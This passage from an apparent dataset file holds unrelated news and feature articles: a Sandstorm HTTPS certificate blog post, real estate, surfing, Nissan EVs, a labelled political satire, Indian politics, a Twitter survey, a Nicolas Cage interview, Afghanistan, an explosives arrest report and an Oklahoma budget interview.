is more than just a technical problem. To be trusted, the certificates must come from a Certificate Authority that is already trusted by your browser. To deliver certificates to you, we needed to work with such an authority.\n\nSo, earlier this year, I began to talk to people at CAs. But there was a complication: Sandstorm requires a wildcard certificate to achieve some of its security properties. That is, if your server is example.sandcats.io , all subdomains *.example.sandcats.io must be covered as well. Wildcard certificates are usually expensive – an order of magnitude more so than normal certificates. And when I talked to the inspiring folks at Let’s Encrypt, I discovered that they weren’t ready to issue wildcard certificates.\n\nI was lucky enough to find Michael Trotta at GlobalSign. He believed in our mission of making servers safe and easy for more people to run. Working together, we were able to set up a deal allowing us to offer free wildcard certificates under sandcats.io. Contracts were signed, and then it was time to write some code.\n\nDefending against the next Heartbleed: Weekly key rotation\n\nWe want Sandstorm to require as little maintenance as possible, so that there’s no reason not to run your own server. We especially want security problems to be solved with no action on your part.\n\nOne of the biggest headaches for server admins in recent memory was Heartbleed, a bug in the popular OpenSSL library which could have revealed people’s private encryption keys to attackers.\n\nPatching the bug is the easy part: If you have automatic updates enabled, your Sandstorm will be updated within 24 hours of any release without any action on your part.\n\nWhat made Heartbleed so bad, though, was not just that systems had to be updated, but that all HTTPS keys and certificates had to be revoked and regenerated, in case they had already been stolen. This was a huge pain for sysadmins, and a huge pain for the certificate revocation infrastructure, which was not designed for everyone in the world to revoke certificates simultaneously.\n\nTo solve this, Sandcats issues certificates valid for only seven days. Your server will automatically generate a new key and receive a new certificate every week. So, any compromise of your private key “fixes itself” over time. Granted, a week is a long time to live with the possibility of an active MITM attack, but realistically it took much longer than that for most revocations to take effect after Heartbleed (if they ever took effect at all).\n\nThe result: Every Sandstorm app is secure for self-hosters\n\nBecause Sandstorm handles HTTPS, rather than the app or the system administrator, the Etherpad package in Sandstorm doesn’t need to have any kind of special integration, nor does the Rocket.Chat package, nor does the Brainstorm package, nor any other.\n\nSo take a moment and install Sandstorm now to securely enjoy these kinds of apps, or at least try the online demo.\n\nAnd if you already have a Sandcats-enabled install of Sandstorm from before today, check out the documentation to enable HTTPS!",

  "latent_22915": "“Somebody said to me, ‘I didn’t realize the gas station was so pretty,’ ” said Michael Shvo, a developer who bought the site for $23.5 million this year.\n\nNevertheless, he and his development partner, Victor Homes, are going ahead with plans to build a 12-story, 15-unit condo beginning next year.\n\n“Developers like these sites for the same reason gas stations wanted to be there originally,” Mr. Shvo said. “Lots of people and lots of traffic.”\n\nLike laundromats, gas stations can be tough to sell because of concerns that the soil beneath them may be polluted, brokers say. A glance around any suburb can reveal stations that have sat empty for years, in part because the sites may be brownfields, requiring the cleanup of chemical pollutants — or at least the fear of that possibility makes it hard to get loans for redevelopment.\n\nOften, deed restrictions have been placed on properties by sellers or long-ago owners, which can ban residential development to avoid health problems and potential lawsuits.\n\nThose restrictions can be lifted before a deal closes, however, if the buyers reassure the sellers by excavating several feet of soil, for example, or installing protective shields.\n\nA restriction like that is now in place at 718 11th Avenue, where a Mobil station on a corner lot at West 51st Street is for sale at $9.5 million. If affordable housing were included, a developer could put up a 29,000-square-foot apartment building on the site, which has a lease in place till 2015, said Matthew Nickerson, a broker with Massey Knakal Realty Services.",

  "latent_23178": "Maya Gabeira outside her headquarters in Nazaré Wednesday, October 28. It was exactly two years since her drowning there. WSL / Kirstin Scholtz\n\nIt's been exactly two years since Maya Gabeira (BRA) nearly died in Nazaré, Portugal, after a falling on a massive wave. She broke her fibula as her feet ripped out of her board straps, was held down for a four-wave set of 50-foot waves and almost didn't make it back on to the ski of her tow partner, Big Wave Tour surfer Carlos Burlé (BRA). When Burlé finally got Gabeira to shore, he and a lifeguard performed CPR to revive her. It was months before she recovered, and even then it was a journey filled with surgeries for her nose and back, physical therapy and baby steps back to the water.\n\nSo why would she return to the place that almost killed her?\n\n\"Because right now it's the biggest wave in the world,\" Gabeira said. Standing in a port warehouse where she and Burlé keep their equipment, she was surprisingly relaxed. The two have come back to Nazaré to try again, armed this time with more knowledge, more safety gear and more mountains to surf.\n\n'Today is the birthday, her second birthday, the 28th,' Burlé said. 'We're never going to forget that.' WSL / Kirstin Scholtz\n\nBy now, Nazaré has become something of a second home for Gabeira: She speaks the language and feels welcome not only on the street, but in the lineup, too. \"It's still uncrowded,\" she said. \"If I want a bomb, it's there for me to take.\n\n\"In other places that space has been filled and it's a bit of a competition. So if you have a wave of this magnitude you can feel comfortable in the lineup and not have to fight for a giant wave. You can prepare yourself and be ready and take it when you can.\"\n\nIt's no coincidence that Gabeira is one of the world's most prominent big wave surfers. She's won multiple XXL Awards (now Big Wave Awards) for performances in huge surf around the world, and has major sponsors like Red Bull and Lululemon. As clouds settled over the Portuguese harbor, Gabeira reflected on the lessons she and Burlé learned from the accident, and what returning to Nazaré has been like.\n\nDid you have any second thoughts about returning to Nazaré?\n\nGabeira has had many loves. Right now, Nazaré has her heart. WSL / Kirstin Scholtz\n\nI never had any second thoughts. I mean, I had a thought that I didn't want to drown again, for sure! But that includes Nazaré, Jaws, and every place I go to. I don't want to go through that again.\n\nI don't really attach my experience to this place. It had to happen and we learned a lot and we were more prepared this year and we realized that what we had [for] safety and as a team in other places [doesn't] really qualify as a safety system here. [Nazaré] is just a little bit harder, a little bit more dangerous and we had to step up our game and have an extra jet ski and bring someone from Brazil that is a master on ski safety and have oxygen on the beach and a spotter on the cliff. In this place it's mandatory.\n\nWe had to learn that the hard way and come back more prepared.\n\nWhat are the advantages of being local to the wave?\n\nGabeira and Burlé have expanded their safety system for Nazaré, including adding weight to her boards. WSL / Kirstin Scholtz\n\nIt is such a great advantage when you can practice on that wave and practice with your equipment and see the wave in all swells and see how it breaks and how you can surf differently and evolve in that spot.\n\nBig wave surfing has been a lot about people who fall in love with a particular wave and then practicing on that wave and being around that wave and mastering that one place. Because it doesn't happen often, you have to be so dedicated to one place to see that wave break. You've got to stack up your experience over years. You've got one huge swell in 2013, then you've got another huge swell in 2014. So it's an advantage when you're in one place and you get to surf that wave more often.\n\nFor you, is that place Nazaré?\n\nI've had love affairs with different waves in different times of my life.\n\nI've had love affairs with different waves in different times of my life. I dedicate my time, work on my equipment and try to be there for the big swells.\n\nCan you remember your first time back in the lineup out there?\n\nIt was a bit scary, it was stressful. So I'm glad it was a small day. I could go through the motions. And actually yesterday [Tuesday, October 27] was big, and only Scooby [Pedro Viana] surfed, we put him in because he's the most energized and best surfer of the team and we said, ‘Ok you just go test the conditions and see how it goes.'\n\n(See 2016 Big Wave Award entries from the latest swell event in Nazaré)\n\nIt was actually good that I didn't surf. I saw it and I studied it, and I didn't have any time to do that the other big day that I was here [two years ago]. It was just straight to the rope, straight to the wave, straight to drowning and straight to the hospital, and straight to a lot of things! I didn't see a lot of things. I didn't even see the lineup, I only saw the set I caught.\n\nAlong with two skis, Gabeira keeps a solid quiver in Nazaré. WSL / Kirstin Scholtz\n\nSo yesterday was a nice experience, to see and understand and to have a plan. When you have a visual of what you want to do, and how you want to surf, and where you can be rescued and where not to be in the lineup it's easier, so the next big swell I'll be a little more confident.\n\nWhat is it that makes you want to go out and do that?\n\nI love to have the opportunity to surf days that I will never forget. To be able to catch a wave that I will remember the day, the time, that emotion and feel satisfied.\n\nWhen you are really present, it's a very special thing.\n\nSometimes when you have that much adrenaline and you're in that moment and you are really present, it's a very special thing. I don't get that feeling in many things I do in life. To be able to find that zone when you're surfing, it makes me want to do that.\n\nDoes it leave you wanting more? Your pursuit of that one feeling?\n\nI don't think it's a one feeling, I think it's a whole experience. Watching it on the maps, and waiting for it, stressing out about it, and not being able to sleep the night before, and waking up and getting your equipment ready, and going to the lineup and seeing what that forecast became and getting to ride it. It's a one-week experience.\n\nWhat does your family think about your career?\n\nWhile Gabeira's family is supportive of her career choice, they still have something to say about it. Her mom has quipped, 'I wish you had a bit more glamour in your life.' WSL / Kirstin Scholtz\n\nMy mom's here. She was on the cliff. She's been pretty cool. Yesterday she said, ‘Yeah. It wasn't that big. I was expecting it to be a little bit bigger.'\n\nDo you think it's because she's seen the worst already?\n\nMaybe she doesn't really realize what's going on in the water. Yesterday she said, ‘I didn't think much of it. The sets weren't consistent enough.' I thought she was going to freak out.\n\nMy mom comes here and she's like, seriously, why did you choose this life?\n\nEvery day she comes here [to the warehouse] and we're getting ready and she's like, ‘Seriously, why did you choose this life? You're always wet and it's cold and it's all guys and you're in this harbor. I wish you had a bit more glamour in your life.'\n\nAnd I said, ‘Oh come on, sometimes I do awards and red carpets.' And then I remembered when I was at the Laureus Awards and I was sick as a dog. It was not glamorous at all, I was puking all over the place.\n\nWhat's your next frontier, or personal goal?\n\nI don't think that far ahead. I'm still trying to conquer Nazaré.",
  "latent_23219": "Ahead of the Tokyo motor show this week, Nissan is dropping hints about what the future of its LEAF electric car might be. We know that the LEAF will have a more powerful battery for 2016. The SL and SV models will have 107 miles of range, while the entry level S model will stick with the current battery that gives 83 miles of range. That actually is a pretty smart marketing move for Nissan. People who buy the S are more likely to be content with a basic people mover for getting back and forth to work and won’t need a lot of expensive options on their cars. Those willing to pay for more features will get longer range as a bonus.\n\nAccording to Green Car Reports, Nissan may also have plans to offer the LEAF in several body styles, much as Toyota does with its Prius. Nissan executive vice president Trevor Mann told AutoCar recently, “There could be more than one Leaf. We’ve always said it needn’t be one car.” Mann hinted broadly that a crossover SUV model may be coming. Nissan has also released a teaser photo of what may be a smaller 3 door hatchback similar to the Prius C. That photo hints at what the second generation LEAF may look like when it gets here in 2017.\n\nTapping into the crossover market is very much on the mind of every manufacturer, and why not? It is the hottest segment of the automotive market, not just in the US but around the world. People are hungry for cute utes, so why not give them electric versions of the vehicles they want most? Tesla’s Elon Musk hinted a few weeks ago in a tweet (later deleted) that his company is working on an SUV version of the upcoming Model 3 with falcon wing doors. He suggested the car might be called the Model Y, which would make the full Tesla lineup S3XY. Get it? Musk may be an eccentric multi-billionaire, but he is not without a sense of humor.\n\nNissan executives Akiko Hoshino and Hiroto Saikawa told the press in Japan that Nissan expects EVs will account for 5% of Nissan sales soon and 10% “in the near future. And if we would use a wider definition of electrification and also count hybrids, more than half will be electric cars.” Presumably they mean plug-in hybrids, not Toyota Prius type hybrids. They say manufacturers will need to rely on electric vehicles to meet strict new emissions regulations coming soon. “The fuel consumption targets will become very stringent, and that will kick in at around 2019/2020, especially in the United States,” said Saikawa. “Suddenly there will be surge of demand.” They also say the price of automotive batteries will have come down enough by then to make the cars affordable.\n\nNissan is known to be working on longer range batteries for its electric cars. Company CEO Carlos Ghosn told shareholders in June that cars with a range of 500 kilometers (more than 300 miles) will be available from Nissan by 2018, according to GOEVGO. It is also developing autonomous driving software of its own. Bertil Schmitt, editor of the The Daily Kanbahn, says, “At the Tokyo Motor Show, Nissan is planning to put more than 100 journalists, foreign and Japanese, in a true autonomous drive Nissan LEAF, and will send them through thick Tokyo city traffic. Freeway is easy; city traffic is the holy grail of autonomous,” Schmitt says.\n\nClearly, Nissan is not standing still while the rest of the automotive world zooms ahead into the future. It is planning for a time when 50% of the cars it sells will be electric or plug-in hybrids and a family of electric vehicles based on the LEAF.

  "latent_23283": "NEW YORK (The Borowitz Report)—In a move that some political observers are calling unprecedented, the Romney campaign today officially requested that Ann Romney be permitted to stand next to her husband during his three scheduled debates with President Obama.\n\nWhile the request drew immediate howls of protest from the Obama campaign, Mrs. Romney issued an official statement claiming that she was not trying to give her husband an unfair advantage.\n\n“I want to stand next to Mitt for my benefit, not his,” Mrs. Romney’s statement read. “Mitt is so human and so warm, I can’t imagine being away from his warm humanity for as long as two hours. That’s how warm a human he is. Really warm and really human.”\n\nBut Mrs. Romney’s statement “doesn’t pass the smell test,” says University of Minnesota political science professor Davis Logsdon, who studied the Romneys’ Sunday appearance on NBC’s “Meet the Press” and noticed Mrs. Romney “emitting a series of barely detectable signals and cues.”\n\n“When we slowed down the video, we noticed that Ann was squeezing Mitt’s right knee with what appears to be a vise-like grip,” Dr. Logsdon says. “From what we could decipher, one squeeze signified ‘agree,’ two squeezes were ‘disagree,’ and three were ‘shut up and let me answer that one.’”\n\nBased on Mr. Romney’s performance, in which he at times disagreed with his running mate Paul Ryan and agreed with President Obama, Dr. Logsdon believes that Mrs. Romney’s presence by her husband’s side at the debates “would be of little use.”\n\n“Ann Romney is clearly trying very hard, but she had more success training her dressage horse,” he says.\n\n_\n\nGet the Borowitz Report delivered to your inbox.\n\nPhotograph by Aram Boghosian/Boston Globe/Getty Images.",
  "latent_23449": "Robert Vadra, the son-in-law of one of India's most powerful politician, Sonia Gandhi, had once scoffed at anti-corruption activists in the country calling them \"mango people in a banana republic.\" This was before the Common Man Party was formed.\n\n\"Mango people\", translated into Hindi, means Aam Aadmi (alternatively translated as common man). Anti-corruption crusader-turned politician Arvind Kejriwal had warned Vadra that \"mango men\" would one day prove to be the nemesis of the powerful elite of India.\n\nNemesis or not, he succeeded in ending the 15-year rule of the Congress Party in Delhi and now is up against the might of \"Brand Modi\", the right-wing Bharatiya Janata Party (BJP)'s prime ministerial candidate Narendra Modi.\n\nIndia's official mango men or the Common Man Party on Thursday released their election manifesto in New Delhi, a plank made up of their campaign base - anti-corruption, social justice, education and transparency.\n\nFrom pressing for police reforms, media regulation legislature, judicial reforms, the AAP manifesto also calls for lowering of eligibility age for contesting the Indian upper house polls from 25 years to 21 years.\n\n\"Our government will put CCTV in police stations. We will put cameras in interrogation rooms. Anybody can ask for that footage using Right to Information,\" Kejriwal said.\n\nThe police have been under attack for their treatment and handling of various cases while Kejriwal was chief minister.\n\nThere are messianic expectations placed on Kejriwal and his team.\n\nSeize control\n\nIn a way Kejriwal's call to action mirrors that of Obama's clarion call to Black America in 2011 to struggle alongside him while campaigning for a second term in office.\n\n\"I expect all of you to march with me and press on,\" Obama said. \"Take off your bedroom slippers, put on your marching shoes. Shake it off. Stop complaining, stop grumbling, stop crying.\"\n\nAAP has also made constant references to the common man to \"seize control\".\n\n\"Niklo baahar makaanon se, jung lado beimaanon se (Come out on the streets and fight the corrupt),\" is a frequently used slogan.\n\nFor a political party which is barely two years old, it is phenomenal that they stand among the counted in India's mammoth electoral exercise - the world's largest.\n\nIt is not that they are not confronted with challenges, the biggest being loss of support among India's middle class which essentially is status quoist. This is also the class that is being wooed aggressively by the BJP's rising star Modi with promises of \"golden growth\".\n\nBy resigning from his 49-day government in the Indian capital, Kejriwal has belied their expectations. A class which is craving for opportunity thought he had one and frittered it away. But those who still believe in him argue that it is not \"opportunity\" but \"change\" which Kejriwal is striving for.\n\nWho else would have argued that there should be a regulator for media in his election manifesto, knowing fully well that the media resists it and also that media has an important role to play in the electoral process.\n\nFor those who believe that the system needs a rude overhaul, AAP is the brightest option. For those for whom change means change of government, AAP’s ‘antics’ are nothing but an invitation to ‘chaos’, a narrative cleverly constructed by their political opponents.\n\nAnd that’s where the last part of the description once created to besmirch Team Kejriwal has come to haunt them – that of a perceived threat to transform the nation into a \"banana republic\".",

We know about brands on Twitter, celebrities on Twitter, politicians on Twitter. We know Twitter apps, hashtags, trends, tools, tips and tricks. But we understand less about the motivations of users: Why do people use Twitter? How do its users feel about common practices there? What are their beliefs about Twitter, and how do they view their experiences?\n\nBig questions, for sure. But in a recent survey on Twitter, we started to uncover some answers. Here are the highlights of a survey of 432 highly involved Twitter users (who spend an average of 2 ¾ hours per day on Twitter).\n\nNorms of Reciprocity\n\nOr, \"I feel bad when someone doesn't follow me back. (Not).\"\n\nOne of the tenets of social psychology research is the prevalence of reciprocity: that people try to repay, in kind, what another person has provided. Does the rule of reciprocation hold on Twitter, a free platform steeped in community and access? In other words, do people feel that Followers on Twitter should reciprocate in kind, and follow them back?\n\nSurprisingly, not really. The survey asked to what extent they agreed that users should follow people who follow them, and whether people who they follow should follow them back. On a scale (1=strongly disagree, 5=strongly agree), the mean for both questions was the same (2.74). Essentially, people don't feel that strongly at all about reciprocation. (Of course, a more subtle interpretation is that they believe — albeit at a low level — that reciprocation should be balanced.)\n\nPerceptual Beliefs\n\nOr, \"People who have a large number of followers are definitely not smarter than those who don't.\"\n\nWhat does it really mean that Ashton has one million followers, and the writer Paulo Coelho, last year named Spain's Best International Writer, has a mere 17,827? Does this mean that Ashton could write circles around Paulo? Is Ashton more widely respected? Or is it really about notoriety and celebrity?\n\nThe latter, according to the survey.\n\nIn other words, people in the survey see a modicum amount of respect associated with higher follower numbers, but little association with how \"smart\" people are.\n\nEmotional Response\n\nOr, \"I don't really care if nobody responds when I tweet something.\"\n\nTwitter is often compared to a large cocktail party or a busy office water cooler. So do people feel bad when they speak and no one is listening? Do they care when no one answers back?\n\nApparently not. The survey asked how strongly people believed with the statement, \"I feel bad when I tweet something and nobody responds.\" The average (2.41) reveals that it doesn't seem to trouble people — at least, it doesn't trouble them all that much.\n\nMotivations\n\n\"It's cool to learn new things from people.\"\n\nPeople use Twitter for all sorts of reasons. But what are those reasons, exactly? Is it about marketing, gathering intelligence, connecting, community? Is it for social reasons?\n\nIn a word: Yes.\n\nTwitter may be used as just another lead-generation tool. Or it may be about connecting with new friends. But above all, people on Twitter are truly motivated by learning new things and getting information real-time, as it's developing.\n\nAbout the survey\n\nThe survey of 432 Twitter users was conducted by MarketingProfs on Twitter from 4/8 to 4/15, 2009. The data was collected and analyzed by Allen Weiss, MarketingProfs CEO, Professor at USC's Marshall School, and @allenweiss on Twitter.\n\nMore Twitter resources from Mashable",

  "latent_23723": "Is this the face of a man with terrible acting skills and a nightmarish haircut? Or is it the face of a man ahead of his time... with a nightmarish haircut? Photo via Flickr user The Conmunity\n\nIt's easy to not really give a shit about Nicolas Cage as an actor. Other than enjoying his performance in Adaptation, to me he was always just that weird guy in moderately entertaining action movies. I mean, the easiest way to summarize his cultural significance is to just yell \"NOT THE BEEEEES!\"\n\nBut I first realized Cage's radical brilliance a few years ago during a screening of Bad Lieutenant: Port of Call New Orleans at the Toronto International Film Fest. His freaked-out take on the notorious Harvey Keitel character in German director Werner Herzog's remake of Bad Lieutenant was beyond bizarre—Cage hallucinates seeing lizards and breakdancing ghosts and smokes from a magic crack pipe while going completely off the rails as a corrupt cop. But as outlandish as his performance was, it's actually more realistic than the generically scummy Keitel version. It presented me with a weird paradox: was Cage's seemingly terrible over-acting actually a truer performance than Keitel with his dick out?\n\nThat question sent me off on an extended trip down the Nic Cage rabbit hole, where I've not only discovered the pure genius of films like Vampire's Kiss and Snake Eyes, but completely reassessed things like Face/Off, Gone in 60 Seconds, and 8mm. It's also made me unnaturally excited for any new addition to the Cage canon (even if it's to figure out what went wrong with a legitimately terrible film like Trespass).\n\nSo I was elated to find out that the latest edition to ECW's \"Pop Classics\" series (which already features the impressively argued It Doesn't Suck: Showgirls) was a book about Cage called National Treasure: Nicolas Cage. In the book-length essay, fellow traveler (and Torontonian) Lindsay Gibb endured around 70 of his films to lay out an extended defense of Cage's brilliance, explaining that he's essentially an experimental actor, who treats all of his roles—even ones in generic Hollywood failures—as opportunities to push the boundaries of the art of acting. VICE talked to Gibb about Cage the genius, Cage the meme, and the misconceptions around Cage's capital-C \"Caginess.\"\n\nVICE: What inspired you to watch all of Nic Cage's films and write the book?\n\nLindsay Gibb: I guess it started because I liked his work, but I didn't think of it as a whole, or that I was a huge fan. I just would sort of see random films and think that I liked him. And then I would hear people saying that Nicolas Cage was a terrible actor and all of his movies are bad, and then I kind of became a defender of him because I'd seen a lot of movies he was in where he was good. When TIFF did the retrospective of his films, I got more hyped on him. From there I started my own Nicolas Cage club with some friends where we started watching one of his films a month. We've been doing that for three years now, but when I pitched the book we'd only been doing that for a year.\n\nBut you've watched all of his films now, yes?\n\nWhen I started writing the book I broke off and was like, \"Sorry guys, I have to start watching some of them by myself.\" I've seen pretty much everything, except some of his newer films. I haven't seen Left Behind yet.\n\nWere there any that are really difficult to track down in hard copy?\n\nFinding Tess was really hard to get. Zandalee was not the easiest to find. It's him and Judge Reinhold. He covers himself in black paint.\n\nWhat's the biggest misconception about Nic Cage?\n\nI think the biggest misconception about Nicolas Cage is that he can't act. That's a criticism that he gets all the time.\n\nWhy do you think he has a bad reputation as an actor?\n\nI think it's because he's a character actor who happens to be really famous. If someone else did it, they would be that guy in that film who you keep seeing. And people might enjoy him more. But because he is the top-billed guy in movies, they expect a certain type of actor, or someone who's cultivated a career that is one thing. But because he does so many different things, it's hard to make sense of him.\n\nWhat's your overall theory?\n\nI guess the book is about both his style of acting and his choices. Those are the things that he's most criticized for—that he only chooses films because he's got to pay down his back taxes. But I'm arguing that he actually has a reason for doing the films that he does. The reason is usually that he's trying something new with acting. Like, he did Sorcerer's Apprentice because it was sort of sci-fi but for kids, because he has a young kid. Some of the sci-fi stuff, he was doing it so he could feel otherworldly in [the films], and have an opportunity to not just play it straight.\n\nAnd he's serious about this otherworldly vibe, right.\n\nYeah. He has a reason behind each role, and I was trying to articulate that in the book.\n\nYou talk about him essentially being an experimental actor.\n\nI think he looks at acting through lenses beyond just straight acting. He looks at them as art, or he looks at it as a painter or a dancer would look at it. And he tries to put more of that into his work.\n\nAnd in the context of Hollywood, that's fairly interesting.\n\nYeah, he's doing mainly Hollywood films. There's the odd independent film, which I think is the only thing that some people see as legit. Like when he does Joe. On one hand, not a lot of people knew about Joe, but everyone who did see it was like, \"Oh, Nicolas Cage can act.\" But it's only in things like that where people are willing to accept that he can act.\n\nWhat is it like for you to spend this much time in the Nicolas Cage rabbit hole?\n\nI was kind of afraid to do it, because any other thing that I love and that I've written about, I've started to hate after a while—after doing it for a while it becomes too much of a job. So I was afraid to do that here because I enjoyed his stuff so much. But I think looking through that lens here of \"Why is he doing that and what is he trying to do with this role?\" made me enjoy him more. I haven't killed the Nic Cage film club yet. Vampire's Kiss and Wild at Heart are still two of my favorites.\n\nWhat are some of the borderline unwatchable Nic Cage films that you had to struggle through?\n\nTypically, I think he's good [even] in the bad films. There are a couple that I don't like at all, like Season of the Witch. It had a good cast and was medieval, so it could have been exciting, but it just wasn't very good.\n\nDo you start to question your theories about him in these situations?\n\nYeah, I'm definitely not happy when I see a film where there's not a lot of redeeming qualities to his performance. I think there were only one to two, maybe four at the most, that were completely terrible and he wasn't that great in. Even if a film was bad, he was usually at least doing something interesting.\n\nThat's a pretty good ratio—\n\nYeah, four out of 70.\n\nDo you ever doubt his explanations of his method acting techniques? Things like \"nouveau shamanic\"?\n\nI definitely had trouble describing them, since there are only ever little interview snippets to go on. I feel like there is something behind them. But when he talks about Wicker Man now, and says after the fact that it was meant to be absurd—that, I believe. But I can understand why people would think that's revisionist.\n\nSeeing him in Bad Lieutenant was what got me interested in him and made me want to go back and rewatch a lot of his other films. But I think a lot of what you're getting at here is how infinitely rewatchable his films are just because of the context he's putting himself in.\n\nThe movies I had to watch the most were Adaptation and Face/Off because I was trying to make a comparison between them, since he's playing double characters in both of those films. I didn't know how I would feel about watching Face/Off again, since I didn't gravitate to him because of his action films. I was more into Adaptation and Moonstruck and Wild at Heart—more of his oddball roles. But when I went back and started watching The Rock, I realized that all of his action stuff has other layers to it. Like, with The Rock, he's trying to play an action hero who doesn't want to be a hero. He likes being a scientist because he doesn't like leaving the office, and the character doesn't swear because it's [out of character for an action hero].\n\nWhat's your favorite Nic Cage scene?\n\nFor the launch party, I was trying to pick out a little montage of scenes, and I felt like all my favorites are things where you have to watch the whole movie to enjoy them. Like, there's a part in Bad Lieutenant where he's in a house with a drug dealer, and he tricks them into giving themselves up, and he walks out of the house and turns to all the other cops and says, \"I love it. I just love it.\" So I put that in the montage, but I know that no one will know what it's about. And then everything in Vampire's Kiss is pretty much amazing.\n\nHave you started attracting Nic Cage fanatics now?\n\nI got contacted by someone who runs a Spanish Nicolas Cage fan site and says he's doing a documentary about Nicolas Cage and wants to interview me. So that's something.\n\nFollow Chris Bilton on Twitter.",

REUTERS/Eric Thayer\n\nAfghan army units are pulling back, and in some cases have been forced to abandon more scattered and rural bases, and the government can claim to control or influence only 57 percent of the country, according to U.S. military estimates from earlier this year.\n\n“The intelligence community assesses that the political and security situation in Afghanistan will almost certainly deteriorate through 2018, even with a modest increase in (the)military assistance by the United States and its partners,” Director of National Intelligence Dan Coats said in a Senate hearing.\n\nIn February, Army General John Nicholson, the U.S. commander in Afghanistan, said he needs several thousand more international troops to break a stalemate with the Taliban.\n\nReuters reported in late April that Trump’s administration was carrying out a review of Afghanistan and conversations are revolving around sending between 3,000 and 5,000 U.S. and coalition troops to Afghanistan.\n\nDeliberations include giving more authorities to forces on the ground and taking more aggressive action against Taliban fighters. This could allow U.S. advisers to work with Afghan troops below the corps level, potentially putting them closer to fighting, a U.S. official said.\n\nIn the same hearing, the head of the military’s Defense Intelligence Agency said the situation would worsen unless U.S. trainers worked with Afghan soldiers closer to the front line, their numbers increased and there was greater intelligence and surveillance.\n\nTrump has not been formally presented with the options yet.\n\nSome U.S. officials said they questioned the benefit of sending more troops to Afghanistan because any politically palatable number would not be enough to turn the tide, much less create stability and security. To date, more than 2,300 Americans have been killed and over 17,000 wounded.\n\nPresident Ashraf Ghani’s U.S.-backed government remains plagued by corruption and divided by factions loyal to political strongmen whose armed supporters often are motivated by ethnic, family, and regional loyalties.\n\nCoats said that Afghanistan would struggle to decrease its reliance on the international community “until it contains the insurgency or reaches a peace agreement with the Taliban.”",

When Schaefer is medically stable, he will be lodged at the Washington County Jail. Additional charges from Wednesday's incident are expected.\n\nKGW quoted court records that said Schaefer pleaded guilty in May to being a felon in possession of body armor. The FBI in September learned that Schaefer had purchased hexamine, which can be used to make a chemical used in homemade explosives for suicide bombings, the station reported.\n\nSchaefer also allegedly purchased remotes intended to set off fireworks from a distance and more than 100 electric matches, court documents said. Investigators determined Schaefer's apartment had explosives that could be detonated remotely.\n\nOn Tuesday, a federal judge approved a search warrant for Schaefer's apartment, and Schaefer was called to the probation department to be interviewed by special agents. He stormed out of the Tuesday interview, court documents said, and his whereabouts were unknown until Wednesday.",

OUR LAWMAKERS FIGHTING TO FILL ANEARLNEARLY $900 MILLION BUDGET DEFICIT. 2018 HAS LEADERSHIP CHANGES IN STORE, INCLUDING A GUBERNATORIALRACE. WHO BETTER TO COVER THE RACE ANDTHE GUBERNATORIAL GAMUT THAN GOVERNOR MARY FALLIN. IT'S BEEN A WHILE SINCE WE HAVE SEEN YOU IN STUDIO. I WANT TO START WITH EDUCATION FUNDING. IT IS APRIL 5. APRIL 1 THE STATE WAS SUPPOSED TO AGREE ON A BUDGET PLAN FOR EDUCATION. IT'S LAW SIGNED BY YOUR PREDECESSOR. APRIL IS THE DAY. THIS HAS FAILED 12 TIMES NOW. IS THIS NOT OUR LAWMAKERSES BREAKING THE LAW?>> THEY PUT IT INTO LAW WHEN I WAS LIEUTENANT GOVERNOR SAYING WE SHOULD BE ABLE TO TELL TEACHERS AND SCHOOLS SO THEY CANDO THEIR CONTRACTS BY APRIL 1 AND HAVE MORE TIME TO BE ABLE TOHIRE TEACHERS AND KNOW HOW MUCH MONEY THEY WILL HAVE, WE WOUND FUND EDUCATION. THE PRACTICALITY IS THE BUDGETS GET DONE AT THE END OF MAY. THE LEGISLATURE HAS NEVER MET THE DEADLINE. FOR THE SCHOOLS, IT MAKES A HARDSHIP ON THEM. LAST YEAR WE HAD A $1.3 BILLION BUDGET SHORTFALL. IT'S BEEN A VERY CHALLENGING TIME TO BE ABLE TO FIGURE OUT WHO DO YOU CUT, WHO DO YOU APPROPRIATE MONEY TO AND WHERE ARE YOU GOING TO FIND THE REVENUE. IT'S NOT EASY. >> I'M SURE IT'S NOT EASY. BUT HOW ARE THERE NOT CONSEQUENCES FOR LAWMAKERS?IF YOU SAY APRIL, IT'S KIND OF APRIL FOOLS. >> THERE ARE NO CONSEQUENCES IN THE LAW. BUT IT IS A LAW. THE LEGISLATURE HASN'T MADE THE DEADLINE. BUT IT IS CHALLENGING, ONCE AGAIN, WHEN YOU'RE TRYING TO BUILD CONSENSUS AND IT IS HARD BECAUSE I'VE BEEN TRYING TO GET THE LEGISLATURE TO BUILD CONSENSUS ON HOW ARE WE GOING TOPRIORITIZE OUR SPENDING, WHAT TYPE OF REVENUE ARE WE GOING TO HAVE, WHERE ARE WE GOING TO CUT.WE'RE STILL IN THAT PROCESS RIGHT NOW. THAT'S WHY LAST WEEK I SAID, YOUKNOW, WE'RE HALFWAY THROUGH THE LEGISLATIVE PROCESS. WE HAVE ABOUT SEVEN WEEKS TO GO.IT'S TIME TO START MAKING DECISIONS. I UNDERSTAND IT'S TOUGH ON THE LEGISLATORS. >> THE OVERALL BUDGET DEFICIT, HAVE TO FILL $900 MILLION SOMEHOW. I KNOW THAT YOU PROPOSED A TAX ON 164 DIFFERENT SERVICES. EVERYTHING FROM DOCTOR'S FEES TOLEGAL FEES, EVEN TATTOOS AND PETGROOMING SERVICES. IS THAT WHERE YOU STAND ON WHAT IS THE MOST EFFECTIVE PLAN. >> THERE'S BEEN DEMAGOGUING AND MISINFORMATION. WHAT I PROPOSE IS THAT WE HAVE ATAX STRUCTURE. I HAVE A CHART I'LL SHOW YOU, IFYOU CAN. IT SHOWS THAT OUR TAX CODE WAS DEVELOPED IN 1933 IN OUR NATION.I DON'T SEE THE CHART YET. THERE IT IS. TAX CODE. >> SWITCH WITH THAT. EXPLAIN WHAT WE ARE SEEING ON THE GRAPHS. >> THIS IS A PICTURE OF THE UNITED STATES. WHAT IT SHOWS IS THAT OUR CODE WAS DEVELOPED IN 1933. TEXAS DEVELOPED THEIR TAX CODE IN 1966. YOU CAN SEE THE VARIOUS YEARS THAT STATES IMPLEMENTED A TAX CODE. BUT THE NEXT CHART I WANT TO SHOW IS OUR GOODS AND SERVICES. WE HAVE CHANGED OUR ECONOMY AS THE NATION HAS, 1929 A GOOD BASESERVICE, WHICH MEANS A LOT OF MANUFACTURING. AS TECHNOLOGY HAS COME ON SINCE THE 1920s, YOU CAN SEE THE SERVICE INDUSTRY HAS OVERTAKEN THE GOODS INDUSTRY, WHICH IS WHAT WE TAX. WE TAX GOODS, BUT WE DON'T TAX SERVICES. I PROPOSE TO THE 